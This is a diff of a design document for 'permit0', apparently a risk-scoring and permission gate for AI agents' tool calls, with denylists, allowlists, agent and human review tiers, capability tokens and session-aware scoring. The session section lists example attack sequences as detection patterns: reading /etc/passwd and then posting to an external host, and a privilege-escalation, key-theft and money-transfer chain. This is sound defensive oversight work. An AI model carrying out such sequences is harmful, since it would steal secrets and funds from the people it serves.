 **Why not HIGH?**
 - Body is benign — no financial or credential patterns
@@ -1572,1358 +1521,578 @@ print(f"routing={score_to_routing(result.tier)}")
 - Single recipient — scope minimal at 5/35
 - No Power or Control flags fired
 
+MEDIUM routes to the agent reviewer via `handle_medium()`. The reviewer sees a benign body with a single recipient → verdict: **HUMAN** (plausible but uncertain; let a human confirm).
+
 ---
 
-## 8. Permission Decision Mapping
+## 10. Permission Decision Mapping
 
-```python
-def tier_to_permission(tier: Tier, blocked: bool = False) -> str:
-    """
-    Public convenience function -- always returns a final Permission.
-    MEDIUM maps to HUMAN as a conservative fallback when agent review
-    is unavailable. Normally MEDIUM is handled by handle_medium().
-    """
-    r = score_to_routing(tier, blocked)
-    return Permission.HUMAN if r == _Routing.AGENT else r
+### Pipeline Entry Point
 
+```rust
+impl Engine {
+    pub fn get_permission(
+        &self,
+        tool_call: &RawToolCall,
+        ctx: &PermissionCtx,
+    ) -> Result<(Permission, Option<CapabilityToken>), EngineError> {
+        // Step 1: Normalize — always first
+        let norm = self.normalizer_registry.normalize(tool_call, &ctx.normalize_ctx)?;
+        let norm_hash = norm.norm_hash();
 
-# Scorer tier → routing:
-# MINIMAL  → Allow    (direct, no review)
-# LOW      → Allow    (direct, no review)
-# MEDIUM   → _Routing.AGENT → handle_medium() → Allow | Human | Deny
-# HIGH     → Human    (direct, no agent review)
-# CRITICAL → Deny     (direct, hard block)
-# blocked  → Deny     (same as CRITICAL regardless of raw score)
+        // Step 2: Denylist — checked before allowlist, deny always wins
+        if let Some(reason) = self.store.denylist_check(&norm_hash)? {
+            self.audit(tool_call, Permission::Deny, &norm, "denylist")?;
+            return Ok((Permission::Deny, None));
+        }
+
+        // Step 3: Allowlist — skips scoring entirely
+        if self.store.allowlist_check(&norm_hash)? {
+            let token = self.issue_token(&norm, IssuingAuthority::Scorer)?;
+            self.audit(tool_call, Permission::Allow, &norm, "allowlist")?;
+            return Ok((Permission::Allow, Some(token)));
+        }
+
+        // Step 4: Policy cache — stored decision, skips scoring
+        if let Some(decision) = self.store.policy_cache_get(&norm_hash)? {
+            self.audit(tool_call, decision, &norm, "policy_cache")?;
+            let token = if decision == Permission::Allow {
+                Some(self.issue_token(&norm, IssuingAuthority::Scorer)?)
+            } else { None };
+            return Ok((decision, token));
+        }
+
+        // Step 5: Unknown action type → bootstrap
+        if !self.has_risk_rule(&norm.action_type) {
+            return self.bootstrap_new_rules(tool_call, &norm);
+        }
+
+        // Step 6: Risk scoring — YAML risk rules → RiskTemplate → compute_hybrid
+        let risk_score = self.assess(&norm, ctx.session.as_ref())?;
+
+        // Step 7: Map score → routing
+        match score_to_routing(risk_score.tier, risk_score.blocked) {
+            Ok(Permission::Allow) => {
+                let token = self.issue_token(&norm, IssuingAuthority::Scorer)?;
+                self.store.policy_cache_set(&norm_hash, Permission::Allow)?;
+                self.audit(tool_call, Permission::Allow, &norm, "scorer")?;
+                Ok((Permission::Allow, Some(token)))
+            }
+            Ok(permission) => {
+                self.store.policy_cache_set(&norm_hash, permission)?;
+                self.audit(tool_call, permission, &norm, "scorer")?;
+                Ok((permission, None))
+            }
+            Err(Routing::Agent) => {
+                // Step 8: Agent reviewer — MEDIUM only
+                let (decision, _) = self.handle_medium(
+                    tool_call, &norm, &risk_score, ctx,
+                )?;
+                self.store.policy_cache_set(&norm_hash, decision)?;
+                Ok((decision, None))
+            }
+        }
+    }
+}
 ```
 
 ### Allowlist and Denylist
 
-Both lists are keyed on `norm_hash` — the hash of the normalized action — not the raw tool call. This means a single entry covers all execution surfaces: the same `email.send` to `@myorg.com` is allowlisted whether it comes via bash, API, or the TypeScript SDK.
+Both lists are keyed on `norm_hash` — the hash of the normalized action — not the raw tool call. A single entry covers all execution surfaces.
 
 **Priority order:** denylist is checked before allowlist. If an action appears on both, it is denied.
 
-```python
-def add_to_denylist(norm: dict, reason: str) -> None:
-    """
-    Hard-block a normalized action pattern permanently.
-    Fires before allowlist and before scoring.
-    Use for patterns that should never execute regardless of context:
-      - known-bad recipients
-      - prohibited action types for this org
-      - actions flagged by a security incident
-    """
-    _denylist[_hash(norm)] = reason
-
-
-def remove_from_denylist(norm: dict) -> None:
-    _denylist.pop(_hash(norm), None)
-
-
-def add_to_allowlist(norm: dict) -> None:
-    """
-    Pre-approve a normalized action pattern, bypassing scoring.
-    Use for patterns that are always safe in this org:
-      - self-send emails
-      - read-only queries against non-sensitive tables
-      - internal API calls that have been manually reviewed
-    Allowlisted calls still generate an audit log entry.
-    """
-    _allowlist[_hash(norm)] = Permission.ALLOW
-
-
-def remove_from_allowlist(norm: dict) -> None:
-    _allowlist.pop(_hash(norm), None)
-
-
-def is_denylisted(norm: dict) -> bool:
-    return _hash(norm) in _denylist
-
-
-def is_allowlisted(norm: dict) -> bool:
-    return _hash(norm) in _allowlist
-```
-
-### Default Policy Cache
-
-The policy cache stores the computed (or human-set) permission for a normalized action pattern. A cache hit means the full scoring pipeline is skipped for that pattern. This is what makes repeated identical actions fast.
-
-The cache key is `norm_hash` — normalized action hash — not the raw tool call. Two different bash commands that normalize to the same `email.send` to the same recipient share a cache entry.
-
-```python
-def set_policy(norm: dict, permission: str) -> None:
-    """
-    Store a permission decision for a normalized action pattern.
-    Called automatically after every scored decision.
-    Can also be called manually to pre-set a policy without scoring.
-    """
-    _policy_cache[_hash(norm)] = permission
-
-
-def get_policy(norm: dict) -> str | None:
-    """Return stored policy for this norm, or None if not cached."""
-    return _policy_cache.get(_hash(norm))
-
-
-def invalidate_policy(norm: dict | None = None) -> None:
-    """
-    Invalidate policy cache entries.
-    Pass norm to invalidate a specific pattern; None clears all.
-
-    Call when:
-      - A risk rule is updated via human review
-      - A quarterly calibration pass changes weights
-      - An org policy change occurs
-      - A human overrides a cached decision
-    """
-    if norm is None:
-        _policy_cache.clear()
-    else:
-        _policy_cache.pop(_hash(norm), None)
-```
-
-**What belongs in each store:**
-
-| Store | Key type | Set by | Use for |
+| Store | Key | Set by | Use for |
 |---|---|---|---|
 | Denylist | norm_hash | Security team, incident response | Known-bad patterns, prohibited actions |
 | Allowlist | norm_hash | Ops team, manual review | Known-safe patterns, pre-approved ops |
-| Policy cache | norm_hash | Scorer (automatic) or human | Default decision for this action pattern |
+| Policy cache | norm_hash | Scorer (automatic) or human | Cached decision for this action pattern |
 
-The denylist and allowlist are configuration — they change rarely and deliberately. The policy cache is operational — it fills automatically and can be cleared at any time without losing configuration.
+The denylist and allowlist are configuration — they change rarely and deliberately. The policy cache is operational — it fills automatically and can be cleared at any time.
+
+Allowlist entries from org policy **must have an expiry date** and a justification.
+
+### Policy Cache Invalidation
+
+```bash
+# Invalidate a specific pattern
+permit0 cache invalidate --norm-hash a3f91b2c7d4e8012
+
+# Clear all cached decisions
+permit0 cache clear
+
+# Triggered automatically by:
+#   - Risk rule updates
+#   - Calibration profile changes
+#   - Org policy changes
+#   - Human overrides of cached decisions
+```
 
 ---
 
-## 9. Capability Token
+## 11. Capability Token
 
-Once an action is approved -- by the rule-based scorer, an agent reviewer, or a human -- permit0 issues a **capability token** using [Biscuit](https://github.com/eclipse-biscuit/biscuit). Downstream tools can verify this token cryptographically without re-running the full risk pipeline.
+Once an action is approved — by the scorer, or a human — permit0 issues a **capability token** using [Biscuit](https://github.com/eclipse-biscuit/biscuit). Downstream tools verify this token cryptographically without re-running the risk pipeline.
 
 ### Why Biscuit?
 
-Biscuit is an open-standard bearer token with two properties that make it well-suited here:
+- **Attenuation** — any holder can narrow a token's scope without contacting the issuer.
+- **Datalog authorisation** — policies are Datalog facts embedded in the token, verified offline.
+- **Offline verification** — verifiers only need the issuer's public key.
 
-- **Attenuation** -- any holder can narrow a token's scope (e.g. restrict it to a single recipient) without contacting the issuer. This lets an agent-loop reviewer issue a tighter token than the original approval granted.
-- **Datalog authorisation** -- policies are expressed as Datalog facts and rules embedded in the token itself, not in a central policy service. A verifier checks the token offline.
+Biscuit is an implementation detail of `permit0-token`. The public API is `Token::mint(...)` and `Token::verify(...)`. Hosts never interact with biscuit types directly.
 
-### Token structure
-
-Each approved action produces one token. The token encodes:
+### Token Claims
 
 | Claim | Type | Description |
 |---|---|---|
-| `action_type` | string | The `domain.verb` that was approved, e.g. `email.send` |
-| `scope` | object | Permitted entity constraints (recipient, path, amount ceiling, etc.) |
-| `issued_by` | enum | Which authority approved: `scorer` / `agent` / `human` |
-| `risk_score` | int | The `score` (0-100) at time of approval |
-| `risk_tier` | string | The tier name: `MINIMAL` / `LOW` / `MEDIUM` / `HIGH` |
+| `action_type` | string | The `domain.verb` that was approved |
+| `scope` | object | Entity constraints: recipient, path_prefix, amount_ceiling, etc. |
+| `issued_by` | enum | `scorer` or `human` |
+| `risk_score` | int | The score (0-100) at time of approval |
+| `risk_tier` | string | MINIMAL / LOW / MEDIUM / HIGH |
 | `session_id` | string | Session this token belongs to |
 | `issued_at` | timestamp | Unix timestamp of issuance |
-| `expires_at` | timestamp | Hard expiry -- token is invalid after this |
-| `safeguards` | list | Required checks before execution (e.g. `["confirm_recipient", "log_body"]`) |
+| `expires_at` | timestamp | Hard expiry |
+| `safeguards` | list | Required checks before execution |
 | `nonce` | bytes | Random bytes preventing replay |
 
-### Scope constraints
+### TTL by Issuing Authority
 
-The `scope` object mirrors the `entities` dict from the normalized action, but with approved-value constraints rather than observed values. This lets a verifier check that the actual arguments stay within what was approved.
-
-```python
-@dataclass
-class TokenScope:
-    action_type:      str
-    # Entity constraints -- None means unconstrained
-    recipient:        str | None = None       # exact match
-    recipient_scope:  str | None = None       # self | internal | external
-    path_prefix:      str | None = None       # files.write: path must start with
-    amount_ceiling:   float | None = None     # payments: amount must be <= this
-    environment:      str | None = None       # must match exactly
-    custom:           dict = None             # action-specific extra constraints
-
-    def verify(self, entities: dict) -> tuple[bool, str]:
-        """Check that actual call entities stay within approved scope."""
-        if self.recipient and entities.get("to") != self.recipient:
-            return False, f"recipient {entities.get('to')!r} not in approved scope"
-        if self.recipient_scope and entities.get("recipient_scope") != self.recipient_scope:
-            return False, "recipient_scope mismatch"
-        if self.path_prefix:
-            path = entities.get("path", "")
-            if not path.startswith(self.path_prefix):
-                return False, f"path {path!r} outside approved prefix {self.path_prefix!r}"
-        if self.amount_ceiling is not None:
-            amount = entities.get("amount", 0)
-            if amount > self.amount_ceiling:
-                return False, f"amount {amount} exceeds approved ceiling {self.amount_ceiling}"
-        if self.environment and entities.get("environment") != self.environment:
-            return False, "environment mismatch"
-        return True, "ok"
-```
-
-### Issuing a token
-
-```python
-from dataclasses import dataclass
-from enum import Enum
-import time, secrets
-
-
-class IssuingAuthority(str, Enum):
-    SCORER  = "scorer"    # rule-based scorer approved autonomously
-    AGENT   = "agent"     # secondary agent approved
-    HUMAN   = "human"     # human operator approved
-
-
-@dataclass
-class CapabilityToken:
-    action_type:   str
-    scope:         TokenScope
-    issued_by:     IssuingAuthority
-    risk_score:    int
-    risk_tier:     str
-    session_id:    str
-    issued_at:     float
-    expires_at:    float
-    safeguards:    list[str]
-    nonce:         str       # hex-encoded random bytes
-
-    def is_expired(self) -> bool:
-        return time.time() > self.expires_at
-
-    def to_claims(self) -> dict:
-        """Serialize to a dict suitable for Biscuit fact encoding."""
-        return {
-            "action_type":  self.action_type,
-            "scope":        self.scope.__dict__,
-            "issued_by":    self.issued_by.value,
-            "risk_score":   self.risk_score,
-            "risk_tier":    self.risk_tier,
-            "session_id":   self.session_id,
-            "issued_at":    self.issued_at,
-            "expires_at":   self.expires_at,
-            "safeguards":   self.safeguards,
-            "nonce":        self.nonce,
-        }
-
-
-# TTL per issuing authority.
-# AGENT entry is removed -- the agent reviewer no longer issues tokens.
-# Tokens are issued only by the scorer (low-risk calls) or by a human.
-TOKEN_TTL: dict[IssuingAuthority, int] = {
-    IssuingAuthority.SCORER: 300,    #  5 min -- auto-approved by scorer
-    IssuingAuthority.HUMAN:  3600,   #  1 hour -- approved by human operator
-}
-
-# Required safeguards per tier
-TIER_SAFEGUARDS: dict[str, list[str]] = {
-    "MINIMAL": [],
-    "LOW":     [],
-    "MEDIUM":  ["log_entities"],
-    "HIGH":    ["log_entities", "log_body", "confirm_before_execute"],
-    "CRITICAL": [],   # CRITICAL never issues a token -- it's DENY
-}
-
-
-def issue_token(
-    risk_score:      "RiskScore",
-    norm_action:     dict,
-    session_id:      str,
-    issued_by:       IssuingAuthority,
-    scope_overrides: dict | None = None,
-) -> CapabilityToken:
-    """
-    Issue a capability token after a permission approval.
-    Only call when tier is not CRITICAL and blocked is False.
-    """
-    if risk_score.blocked or risk_score.tier.name == "CRITICAL":
-        raise ValueError("Cannot issue token for a denied action")
-
-    entities = norm_action.get("entities", {})
-    scope = TokenScope(
-        action_type=norm_action.get("action_type", ""),
-        recipient=entities.get("to"),
-        recipient_scope=entities.get("recipient_scope"),
-        environment=entities.get("environment"),
-        **(scope_overrides or {}),
-    )
-
-    tier_name = risk_score.tier.name
-    now       = time.time()
-    ttl       = TOKEN_TTL[issued_by]
-
-    return CapabilityToken(
-        action_type=norm_action.get("action_type", ""),
-        scope=scope,
-        issued_by=issued_by,
-        risk_score=risk_score.score,
-        risk_tier=tier_name,
-        session_id=session_id,
-        issued_at=now,
-        expires_at=now + ttl,
-        safeguards=TIER_SAFEGUARDS.get(tier_name, []),
-        nonce=secrets.token_hex(16),
-    )
-```
-
-### Verifying a token
-
-```python
-@dataclass
-class VerificationResult:
-    valid:   bool
-    reason:  str
-    token:   CapabilityToken | None = None
-
-
-def verify_token(
-    token:    CapabilityToken,
-    entities: dict,
-) -> VerificationResult:
-    """
-    Verify that a capability token authorises the given tool call entities.
-    Called by the executor immediately before running the action.
-    """
-    # 1. Expiry
-    if token.is_expired():
-        return VerificationResult(False, "token expired")
-
-    # 2. Action type match
-    if entities.get("action_type") and entities["action_type"] != token.action_type:
-        return VerificationResult(
-            False,
-            f"action_type mismatch: token={token.action_type!r} "
-            f"call={entities['action_type']!r}"
-        )
-
-    # 3. Scope constraints
-    ok, reason = token.scope.verify(entities)
-    if not ok:
-        return VerificationResult(False, f"scope violation: {reason}")
-
-    return VerificationResult(True, "ok", token=token)
-```
-
-### Token attenuation
-
-A reviewer can narrow the token's scope before passing it downstream -- restricting to a specific recipient, capping a payment amount, or shortening the TTL.
-
-```python
-def attenuate_token(
-    original:        CapabilityToken,
-    new_scope:       TokenScope,
-    new_ttl_seconds: int | None = None,
-) -> CapabilityToken:
-    """
-    Return a narrowed copy of the token with tighter scope or shorter TTL.
-    Attenuation can only restrict -- it cannot grant new permissions.
-    """
-    now = time.time()
-    return CapabilityToken(
-        action_type=original.action_type,
-        scope=new_scope,
-        issued_by=original.issued_by,
-        risk_score=original.risk_score,
-        risk_tier=original.risk_tier,
-        session_id=original.session_id,
-        issued_at=original.issued_at,
-        expires_at=min(
-            original.expires_at,
-            now + new_ttl_seconds if new_ttl_seconds else original.expires_at,
-        ),
-        safeguards=original.safeguards,
-        nonce=secrets.token_hex(16),
-    )
-```
-
-### Integration with get_permission()
-
-```python
-def get_permission(
-    tool_call:  dict,
-    db,
-    org_domain: str = "",
-    session:    "SessionContext | None" = None,
-) -> tuple[str, CapabilityToken | None]:
-    """
-    Returns (permission, token).
-    token is None when permission is DENY or pending review.
-    token is issued immediately only when permission is ALLOW.
-    AGENT and HUMAN flows issue the token after the reviewer approves.
-    """
-    # ... existing scoring logic ...
-
-    permission = tier_to_permission(risk_score.tier, risk_score.blocked)
-
-    token = None
-    if permission == Permission.ALLOW:
-        token = issue_token(
-            risk_score=risk_score,
-            norm_action=norm,
-            session_id=session.session_id if session else "anonymous",
-            issued_by=IssuingAuthority.SCORER,
-        )
-
-    db.log(tool_call, permission, norm=norm, risk_score=risk_score,
-           token=token, source="scorer")
-    return permission, token
-```
-
-### Worked example
-
-```python
-session = SessionContext(session_id="task-99")
-norm    = normalize_action({
-    "tool": "bash",
-    "arguments": {"command": "gog gmail send --to bob@myorg.com --subject Hi --body Hello"}
-}, org_domain="myorg.com")
-
-fields = {**norm["entities"], "org_domain": "myorg.com", "environment": "production"}
-rs     = assess("email.send", fields, session=session)
-# rs.tier = MEDIUM -> agent reviewer routes to Human-in-the-loop
-# (reviewer never produces Allow; a human must approve)
-
-# After human operator approves:
-token = issue_token(
-    risk_score=rs,
-    norm_action=norm,
-    session_id=session.session_id,
-    issued_by=IssuingAuthority.HUMAN,
-)
-
-print(f"action:   {token.action_type}")      # email.send
-print(f"scope:    {token.scope.recipient}")  # bob@myorg.com
-print(f"approved: {token.issued_by}")        # human
-print(f"ttl:      {int(token.expires_at - token.issued_at)}s")  # 3600
-print(f"guards:   {token.safeguards}")       # ['log_entities']
-
-# Executor verifies before running
-result = verify_token(token, entities=fields)
-print(f"valid:    {result.valid}")           # True
-```
-
-
----
-
-## 10. Learning System
-
-### Decision Record
-
-```python
-from datetime import datetime
-
-@dataclass
-class DecisionRecord:
-    timestamp:      datetime
-    tool_call:      dict         # raw action payload
-    norm_action:    dict         # normalized action
-    risk_score:     RiskScore    # full RiskScore output
-    permission:     str          # final permission granted
-    human_override: bool         # did a human change the automated decision?
-    override_to:    str | None   # what did they change it to?
-    context: dict = dc_field(default_factory=dict)  # user, session, org, env
-
-
-class DecisionDB:
-    """Minimal in-memory DB stub — replace with real persistence."""
-
-    def __init__(self):
-        self._records: list[DecisionRecord] = []
-
-    def log(self, tool_call: dict, permission: str, *,
-            norm: dict | None = None,
-            risk_score: RiskScore | None = None,
-            source: str = "scorer") -> None:
-        record = DecisionRecord(
-            timestamp=datetime.utcnow(),
-            tool_call=tool_call,
-            norm_action=norm or {},
-            risk_score=risk_score or to_risk_score(0.0, [], ""),
-            permission=permission,
-            human_override=False,
-            override_to=None,
-            context={"source": source},
-        )
-        self._records.append(record)
-
-    def record_override(self, record: DecisionRecord, new_permission: str) -> None:
-        record.human_override = True
-        record.override_to    = new_permission
-
-    def human_review(self, label: str, value):
-        """Stub — in production, surfaces `value` to a human reviewer UI."""
-        print(f"[HUMAN REVIEW REQUIRED] {label}: {value}")
-        return value   # assume approved in this stub
-
-    def save(self, label: str, value) -> None:
-        print(f"[SAVED] {label}")
-
-    def training_data(self) -> list[DecisionRecord]:
-        """Return records where a human override occurred — highest-signal data."""
-        return [r for r in self._records if r.human_override]
-```
-
-### Using Decisions as Training Data
-
-```python
-def extract_training_features(record: DecisionRecord) -> dict:
-    """
-    Convert a DecisionRecord into a feature vector for ML training.
-    Human overrides are the most valuable signal — they show where the
-    automated score disagreed with human judgment.
-    """
-    rs = record.risk_score
-    return {
-        # Risk score features
-        "raw_score":       rs.raw,
-        "score":           rs.score,
-        "tier":            rs.tier.value,
-        "flag_count":      len(rs.flags),
-        "blocked":         rs.blocked,
-        # Flag indicators
-        **{f"flag_{f.lower()}": (f in rs.flags) for f in RISK_WEIGHTS},
-        # Action features
-        "action_type":     record.norm_action.get("action_type", ""),
-        "verb":            record.norm_action.get("verb", ""),
-        "domain":          record.norm_action.get("domain", ""),
-        # Label: what did the human decide?
-        "label":           record.override_to or record.permission,
-        "was_overridden":  record.human_override,
-    }
-
-
-def build_training_dataset(db: DecisionDB) -> list[dict]:
-    """
-    Build a labelled dataset from human overrides.
-    Use to:
-      a. Adjust RISK_WEIGHTS for specific flags
-      b. Adjust AMP_WEIGHTS for specific dimensions
-      c. Tighten or loosen BLOCK_RULE thresholds
-      d. Train an ML classifier as a complement to the rule-based scorer
-    """
-    return [extract_training_features(r) for r in db.training_data()]
-```
-
-### Automation Escalation
-
-```python
-def should_auto_approve(
-    action_type: str,
-    db: DecisionDB,
-    confidence_threshold: float = 0.95,
-    min_examples: int = 100,
-) -> bool:
-    """
-    Returns True if a MEDIUM-tier action_type has enough approved
-    examples to be automatically allowed (with monitoring).
-
-    Phase 1: all MEDIUM → Agent-in-the-loop
-    Phase 2: well-understood MEDIUM → Allow (when this returns True)
-    Phase 3: edge MEDIUM cases remain Agent-in-the-loop
-    """
-    approved = [
-        r for r in db._records
-        if r.norm_action.get("action_type") == action_type
-        and r.permission == Permission.ALLOW
-        and not r.human_override   # confirmed by human without override
-    ]
-    overridden = [
-        r for r in db._records
-        if r.norm_action.get("action_type") == action_type
-        and r.human_override
-    ]
-    total = len(approved) + len(overridden)
-    if total < min_examples:
-        return False
-    approval_rate = len(approved) / total
-    return approval_rate >= confidence_threshold
-```
-
-### ML Approaches
-
-| Approach | Use case | Notes |
+| Authority | TTL | Rationale |
 |---|---|---|
-| LLM classifier | Unknown action types, free-text policies | Non-deterministic, use as fallback only |
-| Transformer + classifier | Feature extraction from norm_action | Moderate data requirement |
-| XGBoost / gradient boost | Tabular features from risk scores | Interpretable, low data requirement |
-| Rule-based only | Bootstrap / low-data environment | Fully deterministic, auditable |
+| Scorer (MINIMAL/LOW) | 5 minutes | Auto-approved, short-lived |
+| Human | 1 hour | Reviewed, longer-lived |
 
-Start with rule-based only. Add ML as a **complement**, not a replacement.
-The rule-based scorer always runs; ML can suggest overrides with confidence scores.
+The agent reviewer does not issue tokens. Tokens are issued only by the scorer (low-risk) or after human approval.
 
----
+### Safeguards per Tier
 
-## 11. Calibration Guide
-
-### What Calibrated Means
-
-The system is calibrated when:
-- A human reviewer, shown a tool call and its tier, agrees ≥ 90% of cases
-- Tier distribution across production traffic matches:
-  - MINIMAL / LOW: ~60% (routine reads, internal ops)
-  - MEDIUM: ~25% (sends, writes, external calls)
-  - HIGH: ~10% (sensitive data, financial, prod exec)
-  - CRITICAL: ~5% (should be rare — tune if higher)
-- Block rules fire on real violations, not benign actions
-
-### Calibration Workflow
-
-```python
-def run_calibration(
-    cases: list[tuple[dict, str, Tier]],  # (fields, action_type, expected_tier)
-) -> dict:
-    """
-    Run calibration assertions and return a mismatch report.
-
-    Workflow:
-      1. Collect 20–30 real tool calls, hand-classified into tiers
-      2. Run each through assess() with current weights
-      3. For each mismatch, identify the cause and adjust:
-
-         Scores too high everywhere  → lower tanh constant (1.5 → 1.2)
-         Scores too low everywhere   → raise tanh constant
-         One flag too dominant       → lower its RISK_WEIGHTS entry
-         One amplifier too dominant  → lower its AMP_WEIGHTS entry
-         HIGH/CRITICAL too common    → raise TIER_THRESHOLDS[HIGH]
-         Block rule fires too often  → tighten normalised threshold
-         Block rule never fires      → loosen threshold or remove rule
-
-      4. Re-run until tier disagreement < 10%
-      5. Record calibration cases as regression tests
-    """
-    mismatches = []
-    for fields, action_type, expected_tier in cases:
-        result = assess(action_type, fields)
-        if result.tier != expected_tier:
-            mismatches.append({
-                "action_type":   action_type,
-                "fields":        fields,
-                "got_tier":      result.tier.name,
-                "expected_tier": expected_tier.name,
-                "raw":           result.raw,
-                "flags":         result.flags,
-                "reason":        result.reason,
-            })
-    agreement_rate = 1.0 - len(mismatches) / max(len(cases), 1)
-    return {
-        "total":          len(cases),
-        "mismatches":     len(mismatches),
-        "agreement_rate": round(agreement_rate, 3),
-        "details":        mismatches,
-    }
-
-
-# Example calibration cases for email.send
-EMAIL_CALIBRATION_CASES: list[tuple[dict, str, Tier]] = [
-    # (fields, action_type, expected_tier)
-    (
-        {"recipient_scope": "self", "environment": "dev", "recipient_count": 1},
-        "email.send", Tier.MINIMAL,
-    ),
-    (
-        {"recipient_scope": "internal", "environment": "staging", "recipient_count": 1},
-        "email.send", Tier.LOW,
-    ),
-    (
-        {"recipient_scope": "external", "environment": "production", "recipient_count": 1,
-         "body": "Hello!", "subject": "Hello"},
-        "email.send", Tier.MEDIUM,
-    ),
-    (
-        {"recipient_scope": "external", "environment": "production",
-         "body": "Please wire payment to account 123456", "subject": "Invoice"},
-        "email.send", Tier.HIGH,
-    ),
-    (
-        {"recipient_scope": "external", "environment": "production",
-         "attachments": [{"classification": "confidential"}]},
-        "email.send", Tier.CRITICAL,
-    ),
-]
-```
-
-### Tuning AMP_WEIGHTS
-
-```python
-def tune_amp_weights(new_weights: dict[str, float]) -> None:
-    """
-    Update AMP_WEIGHTS. Enforces budget constraint (must sum to 1.0).
-    To shift weight between dimensions:
-      Before:  destination=0.155  scope=0.136
-      After:   destination=0.170  scope=0.121  (moved 0.015)
-    """
-    total = sum(new_weights.values())
-    if abs(total - 1.0) > 1e-9:
-        raise ValueError(
-            f"AMP_WEIGHTS must sum to 1.0, got {total:.6f}. "
-            f"Adjust weights to compensate — raising one requires lowering another."
-        )
-    AMP_WEIGHTS.update(new_weights)
-```
-
-### Calibration Cadence
-
-| Trigger | Action |
+| Tier | Safeguards |
 |---|---|
-| New action type registered | Calibrate that type with ≥ 5 cases |
-| New risk class observed in prod | Review relevant block rules |
-| Human override rate > 15% | Full calibration pass |
-| Quarterly review | Full calibration pass |
-| Significant policy change | Re-derive TIER_THRESHOLDS |
-| ML model update | A/B test against rule-based baseline |
+| MINIMAL | (none) |
+| LOW | (none) |
+| MEDIUM | `log_entities` |
+| HIGH | `log_entities`, `log_body`, `confirm_before_execute` |
+| CRITICAL | (never issued — CRITICAL is DENY) |
+
+### Scope Verification
+
+The token encodes the approved scope. Before execution, the executor verifies actual arguments stay within scope:
+
+```rust
+pub fn verify_token(
+    token: &BiscuitToken,
+    actual_entities: &Entities,
+    root_public_key: &PublicKey,
+) -> Result<VerificationResult, TokenError> {
+    // 1. Signature verification (biscuit-auth handles this)
+    // 2. Expiry check
+    // 3. Action type match
+    // 4. Scope constraint verification:
+    //    - recipient must match if constrained
+    //    - path must be within path_prefix if constrained
+    //    - amount must be <= amount_ceiling if constrained
+    //    - environment must match if constrained
+}
+```
+
+### Token Attenuation
+
+A reviewer can narrow a token before passing it downstream:
+
+```rust
+pub fn attenuate(
+    original: &BiscuitToken,
+    narrower_scope: &TokenScope,
+    shorter_ttl: Option<Duration>,
+) -> Result<BiscuitToken, TokenError> {
+    // Attenuation can only restrict — never grant new permissions.
+    // Biscuit's native attenuation mechanism handles this.
+}
+```
 
 ---
 
 ## 12. Session-Aware Scoring
 
-The core framework scores each tool call in isolation. But many risks only emerge from the *sequence* of actions in a session, not from any single call.
+The core framework scores each tool call in isolation. But many risks emerge from the *sequence* of actions in a session.
 
-**Single calls that look harmless, dangerous in combination:**
+### Dangerous Combinations
 
-```
-call 1: files.read   path=/etc/passwd       -> LOW
-call 2: network.http_post  url=external.com -> LOW
-```
-
-Each is low risk alone. Together: read a system file then exfiltrate it.
-
-**Sequences that reveal intent:**
+**Single calls that look harmless, dangerous together:**
 
 ```
-call 1: iam.assign_role  role=admin         -> HIGH
-call 2: secrets.read     secret=prod_key    -> MEDIUM
-call 3: payments.transfer  amount=50000     -> HIGH
+call 1: files.read   path=/etc/passwd       → LOW
+call 2: network.http_post  url=external.com → LOW
+Together: read a system file then exfiltrate it.
 ```
 
-Three steps: escalate privilege, steal a key, move money. Each is an independent risk, but the sequence is a complete attack chain.
+**Attack chains:**
+
+```
+call 1: iam.assign_role  role=admin         → HIGH
+call 2: secrets.read     secret=prod_key    → MEDIUM
+call 3: payments.transfer  amount=50000     → HIGH
+Three steps: escalate privilege, steal a key, move money.
+```
 
 **Rate anomalies:**
 
 ```
-calls 1-50: email.send  recipient=external  -> MEDIUM x 50
-```
-
+calls 1-50: email.send  recipient=external  → MEDIUM × 50
 Call 1 is MEDIUM. Call 50 is still MEDIUM. But this is bulk exfiltration.
+```
 
 ### SessionContext
 
-```python
-from dataclasses import dataclass, field
-import time
+```rust
+pub struct SessionContext {
+    pub session_id: String,
+    pub records:    Vec<ActionRecord>,
+}
 
-@dataclass
-class ActionRecord:
-    action_type: str
-    tier:        Tier
-    flags:       list[str]
-    timestamp:   float          # unix timestamp
-    entities:    dict           # key entities snapshot
+pub struct ActionRecord {
+    pub action_type: String,
+    pub tier:        Tier,
+    pub flags:       Vec<String>,
+    pub timestamp:   f64,
+    pub entities:    Entities,
+}
 
+/// Common filter for scoping session queries.
+pub struct SessionFilter {
+    pub action_type:    Option<String>,        // single type
+    pub action_types:   Option<Vec<String>>,   // multiple types (OR)
+    pub entity_match:   Option<Vec<(String, Value)>>,  // entity field conditions
+    pub within_minutes: Option<u64>,           // time window
+}
 
-@dataclass
-class SessionContext:
-    session_id: str
-    records:    list[ActionRecord] = field(default_factory=list)
+impl SessionContext {
+    // ── Existing ─────────────────────────────────────────────
+    pub fn recent(&self, seconds: u64) -> Vec<&ActionRecord>;
+    pub fn count(&self, action_type: Option<&str>, flag: Option<&str>) -> usize;
+    pub fn max_tier(&self) -> Tier;
+    pub fn flag_sequence(&self, last_n: usize) -> Vec<String>;
+    pub fn rate_per_minute(&self, action_type: &str) -> f64;
+    pub fn preceded_by(&self, action_types: &[&str], within: usize) -> bool;
 
-    def recent(self, seconds: int = 300) -> list[ActionRecord]:
-        """Actions within the last N seconds."""
-        cutoff = time.time() - seconds
-        return [r for r in self.records if r.timestamp >= cutoff]
+    // ── Numeric aggregation ──────────────────────────────────
+    /// Sum an entity field across matching records.
+    /// e.g. total transfer amount in the last 24 hours.
+    pub fn sum(&self, field: &str, filter: &SessionFilter) -> f64;
 
-    def count(self, action_type: str = None, flag: str = None) -> int:
-        """Count actions matching type or flag in this session."""
-        results = self.records
-        if action_type:
-            results = [r for r in results if r.action_type == action_type]
-        if flag:
-            results = [r for r in results if flag in r.flags]
-        return len(results)
+    /// Maximum value of an entity field across matching records.
+    /// e.g. largest single charge in the session.
+    pub fn max_val(&self, field: &str, filter: &SessionFilter) -> Option<f64>;
 
-    def max_tier(self) -> Tier:
-        """Highest tier seen so far in this session."""
-        if not self.records:
-            return Tier.MINIMAL
-        return max(r.tier for r in self.records)
+    /// Minimum value of an entity field across matching records.
+    /// e.g. smallest charge (detects card-testing micro-transactions).
+    pub fn min_val(&self, field: &str, filter: &SessionFilter) -> Option<f64>;
 
-    def flag_sequence(self, last_n: int = 5) -> list[str]:
-        """Flattened flag list from the last N actions."""
-        flags = []
-        for r in self.records[-last_n:]:
-            flags.extend(r.flags)
-        return flags
